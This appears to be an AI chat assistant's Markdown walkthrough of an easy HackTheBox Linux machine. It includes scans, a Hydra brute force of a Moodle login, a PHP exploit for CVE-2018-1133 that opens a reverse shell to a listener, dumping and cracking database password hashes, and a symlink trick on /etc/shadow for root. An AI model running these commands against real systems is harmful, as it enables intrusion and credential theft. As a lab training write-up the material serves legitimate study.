## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)

## 🔎 Reconnaissance

### Full TCP Scan
```bash
nmap -sT -p- --min-rate 10000 -oA scans/nmap_alltcp 10.10.10.153
```

### Targeted Service Scan
```bash
nmap -sC -sV -p 80 -oA scans/nmap_services 10.10.10.153
```

---

## 🌐 [Web Enumeration](HTTP)

### Directory Bruteforcing with Gobuster
```bash
gobuster dir --url http://10.10.10.153 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --threads 50
```

### Discover Hidden Credential in Image
```bash
wget http://10.10.10.153/images/5.png
mv 5.png 5.txt
cat 5.txt
```

### Generate Password List (Python)
```python
#!/bin/python3
import string

partial_pass = 'Th4C00lTheacha'

for c in string.printable:
    print(partial_pass + c)
```

### Brute Force Moodle Login with Hydra
```bash
hydra -l giovanni -P passlist.txt 10.10.10.153 \
http-post-form "/moodle/login/index.php:anchor=&username=^USER^&password=^PASS^&Login=Login:Invalid login"
```

---

## 💻 Remote Code Execution (Moodle CVE-2018–1133)

### Use MoodleExploit (PHP)
```bash
php MoodleExploit.php url=10.10.10.153/moodle \
user=giovanni pass='Th4C00lTheacha#' \
ip=10.10.14.51 port=80 course=2
```

### Netcat Listener
```bash
nc -nvlp 80
```

---

## 🧬 Post Exploitation: Privilege Escalation

### 📂 Find Moodle DB Credentials
```bash
cat /var/www/html/moodle/config.php
```

### Connect to MySQL with DB creds
```bash
mysql -u root -p
# Password: Welkom1!
```

### Extract Moodle User Hashes
```sql
USE moodle;
SELECT username, password FROM mdl_user;
```

### Crack MD5 Hash with Hashcat
```bash
hashcat -m 0 hashcat.input /usr/share/wordlists/metasploit/password.lst --force
```

### Switch to giovanni User
```bash
su giovanni
# or SSH with cracked password 'expelled'
```

---

## 🚀 PrivEsc via backup.sh Logic Flaw

### 📁 Create Symlink to /etc/shadow
```bash
ln -s /etc/shadow ~/work/tmp/link
cp ~/work/tmp/link shadow.backup
```

### ✏️ Replace root hash with giovanni's
Edit `/etc/shadow` and copy giovanni’s hash to root’s line.

### Become Root
```bash
su -
# Password: expelled
```

### ✅ Restore Original Shadow File
```bash
cp ~/work/shadow.backup /etc/shadow
```

---

## 🧠 Optional: Symlink to Entire FS (Not Recommended)
```bash
ln -s / tmp/allfolders
```

---

Let me know if you'd like a downloadable Markdown file for this one or want it merged into a full HTB notes doc!